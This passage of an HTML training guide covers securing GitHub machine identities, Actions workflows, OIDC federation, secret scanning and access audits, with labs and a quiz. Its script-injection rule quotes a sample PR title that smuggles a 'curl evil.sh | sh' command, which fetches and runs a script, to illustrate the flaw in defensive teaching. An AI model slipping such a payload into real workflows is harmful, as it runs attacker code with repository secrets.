      <tr><td>Request and justification</td><td>Ticket: which need, which owner (team), which repositories, which permissions</td></tr>
      <tr><td>Issuance</td><td>Create the App or token with minimal permissions</td></tr>
      <tr><td>Storage</td><td>Private key or token in Vault / Azure Key Vault, never in a repository or on a workstation</td></tr>
      <tr><td>Inventory</td><td>List of installed Apps, authorized PATs, deploy keys, with owner and date</td></tr>
      <tr><td>Rotation</td><td>New App private key (you can have two for a seamless switch), then delete the old one</td></tr>
      <tr><td>Revocation</td><td>Uninstall the App, delete the token or key; immediately in case of a leak</td></tr>
      <tr><td>Review</td><td>Periodic: still used? still needed? permissions still justified?</td></tr>
    </tbody>
  </table></div>
  <div class="note ok"><b>SSH certificates (Enterprise plan)</b><p>An organization can declare an <b>SSH certificate authority</b>: instead of permanent SSH keys, people and machines receive short-lived SSH certificates signed by that authority. It is exactly the logic of certificate management applied to Git access.</p></div>
</section>

<section id="actions" data-group="Automate" data-title="GitHub Actions">
  <div class="eyebrow">CI/CD</div>
  <h2>GitHub Actions</h2>
  <p>GitHub Actions automatically runs tasks (tests, lint, deployment) when an event happens: a push, a PR, a schedule, a click.</p>
  <dl class="kv">
    <dt>Workflow</dt><dd>A YAML file in <code>.github/workflows/</code>.</dd>
    <dt>Event (on)</dt><dd>What triggers it: <code>push</code>, <code>pull_request</code>, <code>schedule</code>, <code>workflow_dispatch</code> (manual)…</dd>
    <dt>Job</dt><dd>A set of steps run on a runner. Jobs run in parallel unless <code>needs:</code> is set.</dd>
    <dt>Step</dt><dd>A command (<code>run:</code>) or a reusable action (<code>uses:</code>).</dd>
    <dt>Runner</dt><dd>The machine that runs it: GitHub-hosted (a disposable VM) or self-hosted.</dd>
    <dt>Action</dt><dd>A reusable component published in a repository (<code>actions/checkout</code>).</dd>
  </dl>
  <div class="code"><span class="lbl">.github/workflows/ci.yml — a safe first workflow</span><pre><span class="k">name:</span> CI

<span class="k">on:</span>
  <span class="k">pull_request:</span>
  <span class="k">push:</span>
    <span class="k">branches:</span> [main]

<span class="k">permissions:</span>                 <span class="c"># by default: nothing, then add the bare minimum</span>
  <span class="k">contents:</span> read

<span class="k">jobs:</span>
  <span class="k">lint:</span>
    <span class="k">runs-on:</span> ubuntu-latest
    <span class="k">timeout-minutes:</span> 10
    <span class="k">steps:</span>
      - <span class="k">uses:</span> actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683   <span class="c"># v4.2.2, pinned by SHA</span>
        <span class="k">with:</span>
          <span class="k">persist-credentials:</span> false
      - <span class="k">name:</span> Lint YAML
        <span class="k">run:</span> pipx run yamllint .</pre></div>
  <p>To get the SHA of a recent release: <code>git ls-remote https://github.com/actions/checkout refs/tags/v4.2.2</code> (replace with the latest version listed on the action's "Releases" page). Dependabot can then keep these SHAs up to date.</p>
  <h3>Secrets, variables and environments</h3>
  <div class="tbl"><table>
    <thead><tr><th>Item</th><th>Use</th><th>Access in the workflow</th></tr></thead>
    <tbody>
      <tr><td>Variable</td><td>Non-sensitive value (subscription ID, region name)</td><td><code>${{ vars.NAME }}</code></td></tr>
      <tr><td>Secret</td><td>Sensitive value, encrypted, masked in logs</td><td><code>${{ secrets.NAME }}</code></td></tr>
      <tr><td>Environment</td><td>A group of secrets/variables (<code>staging</code>, <code>prod</code>) with protection rules: required reviewers, wait timer, allowed branches</td><td><code>environment: prod</code> on the job</td></tr>
    </tbody>
  </table></div>
  <p>Levels: organization (shared with chosen repositories), repository, environment. The most specific wins. Put production secrets in a <b>protected environment</b>: the job waits for an authorized person's approval before accessing it.</p>
</section>

<section id="actions-securite" data-group="Automate" data-title="Securing workflows">
  <div class="eyebrow">Supply chain</div>
  <h2>Securing workflows</h2>
  <p>A workflow runs with secrets and write access: it is a very powerful machine identity. Recent supply-chain attacks target pipelines precisely.</p>
  <h3>The 8 rules</h3>
  <ol>
    <li><b>Minimal permissions</b>: <code>permissions: contents: read</code> at workflow level, widened only on the job that needs it. Also set the organization default to "Read repository contents".</li>
    <li><b>Pin third-party actions by full SHA</b>, not by tag (<code>@v4</code> can be moved by an attacker). An organization policy can enforce it, and Actions <i>lockfiles</i> (in preview) also freeze indirect dependencies.</li>
    <li><b>Restrict allowed actions</b>: GitHub actions + verified creators + an allow list.</li>
    <li><b>No script injection</b>: never put a PR title, a branch name or a comment directly into <code>run:</code>.
      <div class="code"><pre><span class="c"># DANGEROUS: a PR title like "a"; curl evil.sh | sh; "" gets executed</span>
- <span class="k">run:</span> echo "${{ github.event.pull_request.title }}"

<span class="c"># CORRECT: go through an environment variable</span>
- <span class="k">env:</span>
    <span class="k">TITLE:</span> ${{ github.event.pull_request.title }}
  <span class="k">run:</span> echo "$TITLE"</pre></div></li>
    <li><b>Beware of <code>pull_request_target</code></b> and <code>workflow_run</code>: they run with the repository's secrets even for a PR coming from a fork. Never check out and run the PR's code there.</li>
    <li><b>Self-hosted runners</b>: never on a public repository; preferably ephemeral (one VM per job); isolated from the internal network as much as possible.</li>
    <li><b>Protect the workflows themselves</b>: CODEOWNERS on <code>.github/workflows/</code>, mandatory review, protected environments for prod.</li>
    <li><b>OIDC rather than long-lived secrets</b> (next section).</li>
  </ol>
  <h3>Coming in 2026</h3>
  <p>In March 2026 GitHub published a security roadmap for Actions: workflow-level dependency locking, execution rules via rulesets (who can trigger what), <b>scoped secrets</b> (bound to a branch, an environment or a specific workflow), a dedicated permission for managing secrets (separate from write access), a telemetry stream to a SIEM, and a native egress firewall on hosted runners. Lockfiles (<code>.github/workflows/actions.lock</code>, the <code>gh actions-lock</code> tool) have been in public preview since October 2026 for Enterprise Cloud.</p>
</section>

<section id="oidc" data-group="Automate" data-title="OIDC: zero secrets">
  <div class="eyebrow">Identity federation</div>
  <h2>OIDC: connecting to the cloud and Vault with no secret at all</h2>
  <p>Instead of storing a service principal secret or an AWS key in GitHub, the job requests an <b>identity token signed by GitHub</b> (a JWT) and exchanges it for temporary access. The provider (Entra ID, Vault, AWS) trusts GitHub and checks <b>who</b> is asking: which repository, which branch, which environment.</p>
  <figure>
    <div class="diagram">
    <svg viewBox="0 0 860 240" role="img" aria-labelledby="oidcTen">
      <title id="oidcTen">OIDC flow between GitHub Actions and a cloud provider</title>
      <defs><marker id="ar4en" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0,0 L10,5 L0,10 z" style="fill:var(--ink-2)"/></marker></defs>

        <text x="24" y="96" style="fill:var(--ink);font:700 14px var(--f-display)">GitHub Actions job</text>
        <text x="24" y="118" style="fill:var(--ink-2)">permissions:</text><text x="24" y="136" style="fill:var(--ink-2)">  id-token: write</text>
        <rect x="320" y="10" width="220" height="80" rx="8" style="fill:var(--accent-soft);stroke:var(--accent)"/>
        <text x="334" y="36" style="fill:var(--accent);font:700 13px var(--f-display)">GitHub OIDC issuer</text>

        <text x="334" y="176" style="fill:var(--ink);font:700 13px var(--f-display)">Entra ID / Vault / AWS</text>
        <text x="334" y="198" style="fill:var(--ink-2)">checks iss, aud, sub</text><text x="334" y="216" style="fill:var(--ink-2)">(repo, branch, env.)</text>
        <rect x="650" y="150" width="200" height="80" rx="8" style="fill:var(--surface);stroke:var(--line)"/>
        <text x="664" y="176" style="fill:var(--ink);font:700 13px var(--f-display)">Resource</text>
        <text x="664" y="198" style="fill:var(--ink-2)">Azure, Vault secret,</text><text x="664" y="216" style="fill:var(--ink-2)">S3 bucket…</text>
      </g>
      <g style="fill:none;stroke:var(--ink-2);stroke-width:1.4">
        <path d="M210 95 L316 55" marker-end="url(#ar4en)"/><path d="M320 75 L214 112" marker-end="url(#ar4en)"/>
        <path d="M210 150 L316 180" marker-end="url(#ar4en)"/><path d="M320 205 L214 165" marker-end="url(#ar4en)"/>
        <path d="M210 175 Q430 250 646 200" marker-end="url(#ar4en)" style="stroke-dasharray:4 4"/>
      </g>
      <g style="font:600 11px var(--f-mono);fill:var(--accent)">
        <text x="222" y="62">① request JWT</text><text x="232" y="112">② signed JWT</text><text x="226" y="158">③ exchange</text><text x="228" y="200">④ short token</text><text x="480" y="244">⑤ temporary access</text>
      </g>
    </svg></div>
  </figure>
  <h3>The GitHub token's claims</h3>
  <div class="tbl"><table>
    <thead><tr><th>Claim</th><th>Example</th><th>Use</th></tr></thead>
    <tbody>
      <tr><td><code>iss</code></td><td><code>https://token.actions.githubusercontent.com</code></td><td>The issuer to declare as trusted</td></tr>
      <tr><td><code>aud</code></td><td><code>api://AzureADTokenExchange</code></td><td>Who the token is meant for</td></tr>
      <tr><td><code>sub</code></td><td><code>repo:kevmat242/lab-oidc:environment:prod</code></td><td>The heart of the trust rule</td></tr>
      <tr><td><code>repository</code>, <code>repository_id</code>, <code>repository_owner_id</code></td><td><code>kevmat242/lab-oidc</code>, <code>812345678</code></td><td>IDs survive renaming a repository or account</td></tr>
      <tr><td><code>ref</code>, <code>environment</code>, <code>event_name</code></td><td><code>refs/heads/main</code>, <code>prod</code>, <code>push</code></td><td>Restrict to a branch or an environment</td></tr>
      <tr><td><code>job_workflow_ref</code></td><td><code>org/ci/.github/workflows/deploy.yml@refs/heads/main</code></td><td>Allow only a central reusable workflow</td></tr>
      <tr><td><code>repo_property_*</code></td><td><code>repo_property_criticality</code></td><td>Repository custom properties (since March 2026)</td></tr>
    </tbody>
  </table></div>
  <p><code>sub</code> formats: <code>repo:OWNER/REPO:ref:refs/heads/main</code>, <code>repo:OWNER/REPO:environment:prod</code>, <code>repo:OWNER/REPO:pull_request</code>. Binding trust to a <b>protected environment</b> is the most robust option: the job only gets it after approval.</p>
  <div class="note danger"><b>The pitfall to avoid</b><p>A trust rule that is too broad (<code>repo:my-org/*</code>, or only <code>repository_owner</code>) lets <b>any</b> repository in the organization, or any branch, get production access. Always pin repository + environment (or branch).</p></div>

  <h3>Example 1: Azure / Entra ID</h3>
  <ol class="steps">
    <li>In Entra ID: an <b>App registration</b> (or a user-assigned managed identity), with no secret at all.</li>
    <li><b>Certificates &amp; secrets → Federated credentials → Add</b>: scenario "GitHub Actions deploying Azure resources", organization <code>kevmat242</code>, repository <code>lab-oidc</code>, entity <b>Environment</b> = <code>prod</code>.</li>
    <li>Give this identity a minimal Azure role (e.g. <code>Reader</code> on a resource group).</li>
    <li>In GitHub: variables <code>AZURE_CLIENT_ID</code>, <code>AZURE_TENANT_ID</code>, <code>AZURE_SUBSCRIPTION_ID</code> (these are not secrets).</li>
  </ol>
  <div class="code"><span class="lbl">.github/workflows/azure.yml</span><pre><span class="k">name:</span> Azure OIDC
<span class="k">on:</span> workflow_dispatch
<span class="k">permissions:</span>
  <span class="k">id-token:</span> write      <span class="c"># allows requesting the JWT</span>
  <span class="k">contents:</span> read
<span class="k">jobs:</span>
  <span class="k">deploy:</span>
    <span class="k">runs-on:</span> ubuntu-latest
    <span class="k">environment:</span> prod     <span class="c"># must match the federated credential's sub</span>
    <span class="k">steps:</span>
      - <span class="k">uses:</span> azure/login@v2
        <span class="k">with:</span>
          <span class="k">client-id:</span> ${{ vars.AZURE_CLIENT_ID }}
          <span class="k">tenant-id:</span> ${{ vars.AZURE_TENANT_ID }}
          <span class="k">subscription-id:</span> ${{ vars.AZURE_SUBSCRIPTION_ID }}
      - <span class="k">run:</span> az group list -o table</pre></div>

  <h3>Example 2: HashiCorp Vault</h3>
  <div class="code"><span class="lbl">Vault side (once, by an administrator)</span><pre>vault auth enable jwt
vault write auth/jwt/config \
  oidc_discovery_url="https://token.actions.githubusercontent.com" \
  bound_issuer="https://token.actions.githubusercontent.com"

vault write auth/jwt/role/lab-oidc-prod - &lt;&lt;EOF
{
  "role_type": "jwt",
  "user_claim": "repository",
  "bound_audiences": ["https://github.com/kevmat242"],
  "bound_claims": {
    "repository_id": "812345678",
    "environment": "prod"
  },
  "token_policies": ["lab-oidc-read"],
  "token_ttl": "10m"
}
EOF</pre></div>
  <div class="code"><span class="lbl">Workflow side</span><pre>- <span class="k">uses:</span> hashicorp/vault-action@v3
  <span class="k">with:</span>
    <span class="k">url:</span> https://vault.example.internal:8200
    <span class="k">method:</span> jwt
    <span class="k">role:</span> lab-oidc-prod
    <span class="k">jwtGithubAudience:</span> https://github.com/kevmat242   <span class="c"># must match bound_audiences</span>
    <span class="k">secrets:</span> |
      kv/data/iam/github-bot private_key | BOT_KEY</pre></div>
  <p>The job reads the secret for at most 10 minutes, without ever having stored a Vault credential. For an internal Vault, you need a runner that can reach it (a self-hosted runner inside the company network).</p>

  <h3>Example 3: AWS</h3>
  <div class="code"><pre>- <span class="k">uses:</span> aws-actions/configure-aws-credentials@v4
  <span class="k">with:</span>
    <span class="k">role-to-assume:</span> arn:aws:iam::123456789012:role/github-lab-oidc
    <span class="k">aws-region:</span> eu-west-3
<span class="c"># Role trust policy: StringEquals condition on</span>
<span class="c"># token.actions.githubusercontent.com:sub = repo:kevmat242/lab-oidc:environment:prod</span></pre></div>
</section>

<section id="secrets-scanning" data-group="Secure" data-title="Secret scanning and push protection">
  <div class="eyebrow">Detecting leaks</div>
  <h2>Secret scanning and push protection</h2>
  <ul>
    <li><b>Secret scanning</b> detects more than 200 types of secrets in code and history (GitHub tokens, Azure and AWS keys, Slack, private keys…). For tokens from many partner providers found in a public repository, GitHub notifies the provider directly, who can revoke them.</li>
    <li><b>Push protection</b> blocks a <code>git push</code> that contains a recognized secret, before it even reaches GitHub. It is on by default for your pushes to public repositories (Settings → Code security).</li>
  </ul>
  <div class="tbl"><table>
    <thead><tr><th>Where</th><th>Availability</th></tr></thead>
    <tbody>
      <tr><td>Public repositories</td><td>Free</td></tr>
      <tr><td>Private organization repositories</td><td>Paid <b>GitHub Secret Protection</b> (Team or Enterprise), billed per active committer</td></tr>
      <tr><td>Code analysis (CodeQL) on private repositories</td><td>Paid <b>GitHub Code Security</b></td></tr>
    </tbody>
  </table></div>
  <p>With Secret Protection you can also define <b>custom patterns</b> (format of internal tokens, service account names) and require a justification for any push protection bypass.</p>
  <div class="note"><b>What to do with an alert?</b><p>Revoke and replace the secret, check its use in the affected system's logs, then close the alert with the right reason ("revoked"). An alert closed as "false positive" without checking is an audit risk.</p></div>
</section>

<section id="dependances" data-group="Secure" data-title="Dependencies and code analysis">
  <div class="eyebrow">Supply chain</div>
  <h2>Dependencies, code analysis and provenance</h2>
  <div class="grid2">
    <div class="card"><h4>Dependabot alerts</h4><p>Alerts when a dependency of your project (pip, npm, Terraform, actions…) has a known vulnerability.</p></div>
    <div class="card"><h4>Dependabot updates</h4><p>Automatically opens update PRs, including for the SHAs of pinned actions.</p></div>
    <div class="card"><h4>Code scanning (CodeQL)</h4><p>Static analysis that finds flaws in your code (injection, hard-coded secrets…).</p></div>
    <div class="card"><h4>Artifact attestations</h4><p>Signed proof (Sigstore) that a binary or image was built by a given workflow, from a given commit. Verifiable with <code>gh attestation verify</code>.</p></div>
  </div>
  <div class="code"><span class="lbl">.github/dependabot.yml</span><pre><span class="k">version:</span> 2
<span class="k">updates:</span>
  - <span class="k">package-ecosystem:</span> github-actions
    <span class="k">directory:</span> /
    <span class="k">schedule:</span>
      <span class="k">interval:</span> weekly
  - <span class="k">package-ecosystem:</span> terraform
    <span class="k">directory:</span> /terraform
    <span class="k">schedule:</span>
      <span class="k">interval:</span> weekly</pre></div>
</section>

<section id="gouvernance" data-group="Govern" data-title="Audit and governance">
  <div class="eyebrow">Prove and control</div>
  <h2>Audit log and access governance</h2>
  <h3>The audit log</h3>
  <p>Organization (<b>Settings → Archive → Logs → Audit log</b>) and enterprise: who added a member, changed a role, created a token, modified a ruleset, installed an App, accessed a secret… Retention is limited: in a company it is <b>streamed to the SIEM</b> (Microsoft Sentinel, Splunk, Datadog, Azure storage) with <i>audit log streaming</i> (Enterprise plan).</p>
  <div class="tbl"><table>
    <thead><tr><th>Useful filter</th><th>What it shows</th></tr></thead>
    <tbody>
      <tr><td><code>action:org.add_member</code>, <code>action:org.update_member</code></td><td>Joiners and role changes</td></tr>
      <tr><td><code>action:personal_access_token</code></td><td>Requests, approvals, revocations of fine-grained PATs</td></tr>
      <tr><td><code>action:integration_installation</code></td><td>Installations and permission changes of GitHub Apps</td></tr>
      <tr><td><code>action:repository_ruleset</code>, <code>action:protected_branch</code></td><td>Changes to protections</td></tr>
      <tr><td><code>action:repo.access</code></td><td>Visibility changes (private → public)</td></tr>
      <tr><td><code>action:org.update_actions_secret</code></td><td>Creation or change of an organization secret</td></tr>
    </tbody>
  </table></div>
  <h3>Inventorying machine identities with the API</h3>
  <div class="code"><span class="lbl">With GitHub CLI (organization Owner rights)</span><pre><span class="c"># Fine-grained PATs authorized on the organization</span>
gh api /orgs/MY-ORG/personal-access-tokens --paginate \
  --jq '.[] | [.owner.login, .token_name, .token_expires_at, .token_last_used_at] | @tsv'

<span class="c"># Installed GitHub Apps and their permissions</span>
gh api /orgs/MY-ORG/installations --paginate \
  --jq '.installations[] | [.app_slug, .repository_selection, (.permissions|tostring)] | @tsv'

<span class="c"># A repository's deploy keys</span>
gh api /repos/MY-ORG/MY-REPO/keys --jq '.[] | [.title, .read_only, .created_at] | @tsv'

<span class="c"># Outside collaborators</span>
gh api /orgs/MY-ORG/outside_collaborators --paginate --jq '.[].login'</pre></div>
  <p>Run every week by a scheduled workflow, these commands produce a report: expiring tokens, tokens unused for 90 days, Apps with <code>Administration: write</code> permissions, write-enabled deploy keys. It is GitHub's equivalent of a certificate inventory.</p>
  <h3>An employee leaving (without EMU)</h3>
  <ol>
    <li>Remove the account from the organization (their PATs and SSH keys lose access to the organization's resources).</li>
    <li>Check the GitHub Apps and OAuth Apps they owned; transfer ownership.</li>
    <li>Check the secrets they knew (environments they approved, shared secrets) and rotate them if needed.</li>
    <li>Check the deploy keys and webhooks they created.</li>
  </ol>
  <h3>Quarterly access review: the checklist</h3>
  <ul>
    <li>Organization owners and repository admins.</li>
    <li>Outside collaborators and their contract end date.</li>
    <li>Members inactive for 90 days.</li>
    <li>PATs, Apps, deploy keys: owner, usage, permissions, expiry.</li>
    <li>Ruleset bypass lists.</li>
    <li>Authorized reviewers of production environments.</li>
  </ul>
</section>

<section id="integrations" data-group="Govern" data-title="With Terraform, Ansible, Vault, PKI">
  <div class="eyebrow">Your ecosystem</div>
  <h2>GitHub with Terraform, Ansible, Vault and PKI</h2>
  <h3>Managing GitHub itself as code with Terraform</h3>
  <p>The <code>integrations/github</code> provider manages repositories, teams, permissions, rulesets and secrets. Access becomes reviewed in PRs and traceable. Authenticate it with a <b>GitHub App</b>, not a PAT.</p>
  <div class="code"><pre><span class="k">provider</span> <span class="s">"github"</span> {
  owner = <span class="s">"example-iam"</span>
  app_auth {}            <span class="c"># GITHUB_APP_ID, GITHUB_APP_INSTALLATION_ID, GITHUB_APP_PEM_FILE</span>
}

<span class="k">resource</span> <span class="s">"github_team"</span> <span class="s">"iam_devs"</span> {
  name    = <span class="s">"iam-devs"</span>
  privacy = <span class="s">"closed"</span>
}

<span class="k">resource</span> <span class="s">"github_team_repository"</span> <span class="s">"iam_devs_ansible"</span> {
  team_id    = github_team.iam_devs.id
  repository = <span class="s">"ansible-iam"</span>
  permission = <span class="s">"push"</span>     <span class="c"># = Write</span>
}

<span class="k">resource</span> <span class="s">"github_repository_ruleset"</span> <span class="s">"main"</span> {
  name        = <span class="s">"protect-main"</span>
  repository  = <span class="s">"ansible-iam"</span>
  target      = <span class="s">"branch"</span>
  enforcement = <span class="s">"active"</span>
  conditions {
    ref_name {
      include = [<span class="s">"~DEFAULT_BRANCH"</span>]
      exclude = []
    }
  }
  rules {
    deletion                = true
    non_fast_forward        = true
    required_signatures     = true
    pull_request {
      required_approving_review_count = 1
      require_code_owner_review       = true
      dismiss_stale_reviews_on_push   = true
    }
  }
}</pre></div>
  <h3>Terraform and Ansible pipelines</h3>
  <ul>
    <li><b>Terraform</b>: <code>plan</code> on every PR with a read-only OIDC identity; <code>apply</code> after merge, in the protected <code>prod</code> environment, with a separate write OIDC identity.</li>
    <li><b>Ansible</b>: <code>yamllint</code>, <code>ansible-lint</code> and <code>--syntax-check</code> on every PR; production runs preferably stay in AAP/AWX, triggered by the merge (webhook or API), with the platform's credentials.</li>
    <li><b>Vault</b>: workflows fetch secrets via OIDC (previous section), with Vault policies per repository and environment.</li>
  </ul>
  <h3>Certificates: Venafi (NGTS) and Sectigo</h3>
  <ul>
    <li>A workflow can request or renew a certificate from the certificate management platform (e.g. the <code>vcert</code> CLI for the former Venafi platform, now <i>Next-Generation Trust Security</i> at Palo Alto Networks; ACME or API for Sectigo), with an API secret itself fetched from Vault via OIDC.</li>
    <li>A <b>GitHub App's private key</b> is a cryptographic secret: inventoried, stored in a vault, rotated periodically, exactly like a certificate key.</li>
    <li>Code signing and artifact attestations complete the chain of trust: you know <i>who</i> built <i>what</i>, from <i>which</i> code.</li>
  </ul>
</section>

<section id="actualites" data-group="Govern" data-title="2025-2026 news">
  <div class="eyebrow">What changed</div>
  <h2>What's new to know (2025-2026)</h2>
  <ul>
    <li><b>March 2025</b>: fine-grained PATs reach general availability; organization approval of PATs is on by default.</li>
    <li><b>April 2025</b>: GitHub Advanced Security is split into two separately purchasable products, <b>Secret Protection</b> and <b>Code Security</b>, now available to organizations on the Team plan.</li>
    <li><b>August 2025</b>: Actions policies can block specific actions and <b>enforce SHA pinning</b>.</li>
    <li><b>November 2025</b>: npm (also owned by GitHub) disables classic token creation in favor of granular tokens, after several supply-chain attacks.</li>
    <li><b>March 2026</b>: Actions security roadmap (dependency locking, scoped secrets, execution rules, egress firewall, telemetry); OIDC tokens can include repository <b>custom properties</b> (<code>repo_property_*</code>) for attribute-based access policies.</li>
    <li><b>October 2026</b>: public preview of Actions <b>lockfiles</b> and the "Require lockfile" policy on Enterprise Cloud.</li>
    <li><b>AI agents</b>: Copilot and third-party agents can open PRs and act in repositories. They are new non-human identities: apply the same rules to them (minimal permissions, mandatory review of their PRs, traceability).</li>
  </ul>
</section>

<section id="tp" data-group="Practice" data-title="The 10 labs">
  <div class="eyebrow">On your personal GitHub account</div>
  <h2>The 10 hands-on labs</h2>
  <p>Everything is free with your <code>kevmat242</code> account. Create a <b>private</b> repository <code>lab-github-iam</code> for the labs (unless stated otherwise). Never put real company data in these exercises.</p>

  <details open><summary>Lab 1 — Local Git (1 h)</summary>
    <ol>
      <li><code>mkdir ~/lab-git &amp;&amp; cd ~/lab-git &amp;&amp; git init</code></li>
      <li>Create <code>README.md</code> and commit. Create a <code>feature/a</code> branch, change line 1, commit.</li>
      <li>Go back to <code>main</code>, change the same line differently, commit. Merge <code>feature/a</code>: <b>resolve the conflict</b>.</li>
      <li>Make a "bad" commit, undo it with <code>git reset --soft HEAD~1</code>, then find a commit with <code>git reflog</code>.</li>
      <li>Success if: <code>git log --oneline --graph</code> shows the merge commit and you can explain each line.</li>
    </ol>
  </details>
  <details><summary>Lab 2 — Remote repository and pull request (1 h)</summary>
    <ol>
      <li><code>gh repo create lab-github-iam --private --clone</code></li>
      <li>Add a <code>.gitignore</code> (see the dedicated section) and a <code>README.md</code>, push to <code>main</code>.</li>
      <li>Branch <code>feature/doc</code>, one change, <code>gh pr create --fill</code>.</li>
      <li>In the UI: comment on a line, then merge with <b>Squash and merge</b> and delete the branch.</li>
    </ol>
  </details>
  <details><summary>Lab 3 — Ruleset and CODEOWNERS (45 min)</summary>
    <ol>
      <li>Settings → Rulesets → <b>New branch ruleset</b>: name <code>protect-main</code>, Enforcement <b>Active</b>, target <b>Default branch</b>.</li>
      <li>Tick: Restrict deletions, Block force pushes, Require a pull request (0 approvals, since you are alone), Require signed commits (after Lab 4).</li>
      <li>Try a direct <code>git push</code> to <code>main</code>: it must be refused.</li>
      <li>Add <code>.github/CODEOWNERS</code> with <code>* @kevmat242</code>.</li>
      <li>Note: on a private repository with a free account, some rules require a paid plan. If so, do this lab on a public test repository with no sensitive content.</li>
    </ol>
  </details>
  <details><summary>Lab 4 — Securing your account and signing your commits (30 min)</summary>
    <ol>
      <li>Settings → Password and authentication: add a <b>passkey</b>, check 2FA, store the recovery codes.</li>
      <li>Set up SSH signing (dedicated section), add the key as a <b>Signing Key</b>, enable <b>Vigilant mode</b>.</li>
      <li>Push a commit: it must show as <span class="chip ok">Verified</span>.</li>
    </ol>
  </details>
  <details><summary>Lab 5 — Fine-grained PAT: issue, use, revoke (30 min)</summary>
    <ol>
      <li>Settings → Developer settings → Personal access tokens → <b>Fine-grained tokens</b> → Generate.</li>
      <li>Expiry 7 days, only <code>lab-github-iam</code>, <code>Contents: Read</code> permission only.</li>
      <li>Test: <code>GH_TOKEN=github_pat_xxx gh api repos/kevmat242/lab-github-iam/contents/README.md --jq .name</code> works; try another repository: refused.</li>
      <li>Try to create a file with this token: refused (read-only). Then <b>revoke</b> the token and check it no longer works.</li>
    </ol>
  </details>
  <details><summary>Lab 6 — Your first GitHub App (1 h)</summary>
    <ol>
      <li>Create the App <code>kevmat242-lab-bot</code> (GitHub Apps section) with <code>Contents: Read and write</code> and <code>Issues: Read and write</code>, webhook disabled.</li>
      <li>Generate the private key, install the App on <code>lab-github-iam</code> only.</li>
      <li>In the repository: variable <code>LAB_BOT_APP_ID</code>, secret <code>LAB_BOT_PRIVATE_KEY</code> (the .pem content). Then delete the .pem from your PC.</li>
      <li>A manual workflow gets a token with <code>actions/create-github-app-token</code> and creates an issue: it appears under the name <code>kevmat242-lab-bot[bot]</code>.</li>
      <li>Rotation: generate a second key, update the secret, run again, then delete the old key.</li>
    </ol>
  </details>
  <details><summary>Lab 7 — Secure workflow and protected environment (1 h)</summary>
    <ol>
      <li>Add the <code>ci.yml</code> workflow from the Actions section (minimal permissions, action pinned by SHA).</li>
      <li>Settings → Environments → <b>New environment</b> <code>prod</code>: Required reviewers = you, allowed branches = <code>main</code>.</li>
      <li>Add an environment secret <code>DEMO_SECRET</code> and a job with <code>environment: prod</code> that prints <code>echo "length: ${#DEMO_SECRET}"</code>.</li>
      <li>Observe: the job waits for your approval, and the secret is masked (<code>***</code>) in the logs.</li>
      <li>Add <code>.github/dependabot.yml</code> for <code>github-actions</code>.</li>
    </ol>
  </details>
  <details><summary>Lab 8 — OIDC to Azure, with no secret at all (1 h 30)</summary>
    <ol>
      <li>Prerequisite: a personal Azure subscription (free account), never the company tenant.</li>
      <li>Repository <code>lab-oidc</code>, protected <code>prod</code> environment.</li>
      <li>Entra ID: App registration <code>gh-lab-oidc</code>, <b>federated credential</b> GitHub Actions → <code>kevmat242/lab-oidc</code>, Environment <code>prod</code>. <code>Reader</code> role on a test resource group.</li>
      <li>The <code>azure.yml</code> workflow from the OIDC section: <code>az group list</code> works.</li>
      <li>Security experiment: remove <code>environment: prod</code> from the job and run again. Authentication must <b>fail</b> (<code>AADSTS700213</code>: no federated credential matches the <code>sub</code>). You have just verified that trust is properly scoped.</li>
      <li>Add a step that prints the claims (without the signature) to observe them:
        <div class="code"><pre>- <span class="k">run:</span> |
    TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
      "$ACTIONS_ID_TOKEN_REQUEST_URL&amp;audience=api://AzureADTokenExchange" | jq -r .value)
    echo "$TOKEN" | cut -d. -f2 | python3 -c 'import sys,base64,json
s=sys.stdin.read().strip(); s+="="*(-len(s)%4)
c=json.loads(base64.urlsafe_b64decode(s))
print(json.dumps({k:c.get(k) for k in ("sub","repository","repository_id","environment","ref")}, indent=2))'</pre></div></li>
    </ol>
  </details>
  <details><summary>Lab 9 — Secret scanning and push protection (30 min)</summary>
    <ol>
      <li>On a <b>public</b> test repository: Settings → Code security → check that Secret scanning and Push protection are on.</li>
      <li>Read the list of detected patterns in the docs ("Supported secret scanning patterns").</li>
      <li>Reuse Lab 5: generate a test PAT, try to commit it in a file and push. The push must be <b>blocked</b>. Don't bypass: remove the file (<code>git reset --soft HEAD~1</code>), then <b>revoke</b> the token.</li>
    </ol>
  </details>
  <details><summary>Lab 10 — Inventory and audit (1 h)</summary>
    <ol>
      <li>Create a free organization <code>kevmat242-lab</code> (Settings → Organizations → New organization, Free plan).</li>
      <li>Transfer <code>lab-github-iam</code> to it, create an <code>iam-devs</code> team with the Write role on the repository, and set the base permission to <code>No permission</code>.</li>
      <li>Install your App on the organization, create a fine-grained PAT targeting the organization and approve it.</li>
      <li>Run the inventory commands from the Audit section, then open the organization's audit log and find each action you performed.</li>
      <li>Bonus: a workflow scheduled every Monday that produces this report as a CSV file in the run's artifacts.</li>
    </ol>
  </details>
</section>

<section id="quiz" data-group="Practice" data-title="Self-assessment quiz">
  <div class="eyebrow">Check your knowledge</div>
  <h2>Self-assessment quiz</h2>
  <details><summary>What is the difference between Git and GitHub?</summary><p>Git is the version control software, local; GitHub is the platform that hosts repositories and adds collaboration, automation and access control.</p></details>
  <details><summary>What does <code>git add</code> do?</summary><p>It puts changes in the index: they will be part of the next commit.</p></details>
  <details><summary>Merge or rebase on main?</summary><p>Merge (or a PR): you never rewrite the history of a shared branch. Rebase is for your personal branch.</p></details>
  <details><summary>You pushed a password. First action?</summary><p>Revoke and replace it immediately. Cleaning the history comes after.</p></details>
  <details><summary>Why does a commit's author prove nothing?</summary><p>Because <code>user.name</code> and <code>user.email</code> are free text. Only a verified signature proves the author.</p></details>
  <details><summary>Which identity for a tool that manages several repositories?</summary><p>A GitHub App: tied to no person, fine-grained permissions, one-hour tokens, actions attributed to the bot in the audit log.</p></details>
  <details><summary>Why avoid classic PATs?</summary><p>They can never expire, give access to everything the person can see with broad scopes, and stay tied to an employee who may leave.</p></details>
  <details><summary>What does the <code>sub</code> of a GitHub OIDC token contain?</summary><p>The requester's identity, for example <code>repo:OWNER/REPO:environment:prod</code> or <code>repo:OWNER/REPO:ref:refs/heads/main</code>.</p></details>
  <details><summary>Which permission does a job need to use OIDC?</summary><p><code>id-token: write</code>.</p></details>
